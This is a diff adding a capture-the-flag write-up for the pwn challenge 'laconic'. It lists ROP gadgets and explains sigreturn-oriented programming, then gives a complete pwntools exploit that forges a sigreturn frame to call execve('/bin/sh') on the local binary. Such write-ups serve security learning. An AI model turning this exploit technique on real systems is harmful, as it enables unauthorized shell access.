@@ -1,0 +1,147 @@
+* Description
+
+Sir Alaric's struggles have plunged him into a deep and overwhelming sadnessl, leaving him unwilling
+to speek to anyone. Can you find a way to lift his spirits and bring back his courage?
+
+* Solution
+
+Let's play with the program, we'll get following:
+[[file:2025-04-19_13-35.png]]
+
+So, it's do something like =shellcode=, which require input with length *262*.
+
+[[file:2025-04-19_13-42.png]]
+
+We can see that program only call a ~read(0, rsp - 8, 0x106)~ syscall then exit. According to the
+=cheksec= and debug info, the ~NX~ not enable.
+
+So let's check the program =gadgets=:
+#+begin_src bash
+Trying to open 'dist/laconic'..
+Loading ELF information..
+FileFormat: Elf, Arch: x64
+
+Wait a few seconds, rp++ is looking for gadgets (2 threads max)..
+A total of 36 gadgets found.
+You decided to keep only the unique ones, 35 unique gadgets found.
+0x43006: add byte [rax-0x77], cl ; out 0x48, al ; sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43006: add byte [rax-0x77], cl ; out 0x48, al ; sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43004: add byte [rax], al ; add byte [rax-0x77], cl ; out 0x48, al ; sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43003: add byte [rax], al ; add byte [rax], al ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43005: add byte [rax], al ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43005: add byte [rax], al ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43013: add byte [rax], al ; syscall ; ret ; (1 found)
+0x43013: add byte [rax], al ; syscall ; (1 found)
+0x43002: mov  [rax], 0x48000000 ; mov esi, esp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43002: mov  [rax], 0x48000000 ; mov esi, esp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43001: mov edi, 0x00000000 ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43001: mov edi, 0x00000000 ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x4300f: mov edx, 0x00000106 ; syscall ; ret ; (1 found)
+0x4300f: mov edx, 0x00000106 ; syscall ; (1 found)
+0x43008: mov esi, esp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43008: mov esi, esp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43000: mov rdi, 0x0000000000000000 ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43000: mov rdi, 0x0000000000000000 ; mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x4300e: mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x4300e: mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43007: mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43007: mov rsi, rsp ; sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x4300d: or byte [rax-0x39], cl ; retn 0x0106 ; (1 found)
+0x43009: out 0x48, al ; sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x43009: out 0x48, al ; sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x4300c: out dx, al ; or byte [rax-0x39], cl ; retn 0x0106 ; (1 found)
+0x43018: pop rax ; ret ; (1 found)
+0x43017: ret ; (2 found)
+0x43010: retn 0x0106 ; (1 found)
+0x4300b: sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x4300b: sub esi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x4300a: sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; ret ; (1 found)
+0x4300a: sub rsi, 0x08 ; mov rdx, 0x0000000000000106 ; syscall ; (1 found)
+0x43015: syscall ; ret ; (1 found)
+0x43015: syscall ; (1 found)
+#+end_src
+
+We can see that gadgets is very limited. Seems that we can't place shellcode to stack then jump(ret)
+to it directly. But luckily, there're ~pop rax; ret~ and ~syscall~. So we can control the syscall we
+want, after some investigation within Google. I find that [[https://en.wikipedia.org/wiki/Sigreturn-oriented_programming][SROP]] can successfully achieve the goal.
+
+#+begin_src python :results output
+#!/usr/bin/env python
+
+from pwn import *
+context.arch = 'amd64'
+
+# cause strings ./dist/laconic show that program have /bin/sh already
+# pwndbg> search /bin/sh
+# Searching for byte: b'/bin/sh'
+# laconic         0x43238 0x68732f6e69622f /* '/bin/sh' */
+binsh_addr = 0x43238
+# SROP Frame
+frame = SigreturnFrame()
+frame.rax = 0x3b                          # execve syscall number
+frame.rdi = binsh_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = 0x43015                       # syscall
+
+payload = b'A' * 8 # padding for rsp - 8
+payload += p64(0x43018)
+payload += p64(0xf)                # sigreturn syscall number
+payload += p64(0x43015)
+payload += bytes(frame)
+
+if args.GDB:
+    io = gdb.debug('./dist/laconic', '''
+    b *0x43017
+    c
+    ''')
+else:
+    io = process('./dist/laconic')
+_ = io.sendline(payload)
+
+io.interactive()
+#+end_src
+
+amd64 architecture Sigreturnframe:
+#+begin_src ipython
+In [3]: context.arch = 'amd64'
+
+In [4]: f = SigreturnFrame()
+
+In [5]: len(f)
+Out[5]: 248
+
+In [6]: f
+Out[6]:
+{'uc_flags': 0,
+ '&uc': 0,
+ 'uc_stack.ss_sp': 0,
+ 'uc_stack.ss_flags': 0,
+ 'uc_stack.ss_size': 0,
+ 'r8': 0,
+ 'r9': 0,
+ 'r10': 0,
+ 'r11': 0,
+ 'r12': 0,
+ 'r13': 0,
+ 'r14': 0,
+ 'r15': 0,
+ 'rdi': 0,
+ 'rsi': 0,
+ 'rbp': 0,
+ 'rbx': 0,
+ 'rdx': 0,
+ 'rax': 0,
+ 'rcx': 0,
+ 'rsp': 0,
+ 'rip': 0,
+ 'eflags': 0,
+ 'csgsfs': 51,
+ 'err': 0,
+ 'trapno': 0,
+ 'oldmask': 0,
+ 'cr2': 0,
+ '&fpstate': 0,
+ '__reserved': 0,
+ 'sigmask': 0}
+#+end_src
